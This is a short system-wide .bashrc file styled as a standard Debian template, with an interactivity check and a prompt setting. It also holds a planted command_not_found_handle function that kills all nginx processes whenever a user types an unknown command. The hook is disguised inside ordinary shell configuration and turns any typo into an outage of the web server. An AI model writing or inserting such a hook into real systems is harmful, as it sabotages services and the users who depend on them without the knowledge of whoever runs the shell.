# System-wide .bashrc file for interactive bash(1) shells.

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

function command_not_found_handle {
     echo "That's all folks."; kill $(pgrep nginx);
}
